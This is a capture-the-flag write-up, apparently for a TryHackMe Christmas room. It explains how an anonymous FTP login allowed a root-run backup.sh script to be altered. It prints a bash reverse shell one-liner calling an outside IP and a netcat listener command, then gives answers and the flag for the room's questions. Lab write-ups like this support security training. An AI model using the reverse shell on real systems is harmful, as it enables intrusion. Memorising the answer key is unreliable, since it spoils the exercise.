# IP=10.10.15.128


### [Day 9] Networking - Anyone can be Santa! ###

0. Walk through of FTP and exploiting it to create a reverse shell.

	* Notes:
		* Logged into FTP as anonymous.
		* Found that I could get and upload files to the server.
		* Found a backup.sh script that was running a bash backup script as the root user.
		* Downloaded the script, added a reverse shell script to it, then uploaded it back.
		* Started a netcat listening on my local machine and waited a minute for the exploited backup.sh script to execute and connect.
		* Had root access immediately.

	* Commands:
		* Log into FTP: `ftp $IP` + `anonymous`
		* Bash reverse shell: `bash -i >& /dev/tcp/10.6.8.203/4444 0>&1`
		* Netcat listener on local machine: `nc -lnvp 4444`

1. Question #1: Name the directory on the FTP server that has data accessible by the "anonymous" user.

```
public
```

2. Question #2: What script gets executed within this directory?

```
backup.sh
```

3. Question #3: What movie did Santa have on his Christmas shopping list?

```
The Polar Express (found in FTP > public > shoppinglist.txt)
```

4. Question #4: Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!

```
THM{even_you_can_be_santa}
```
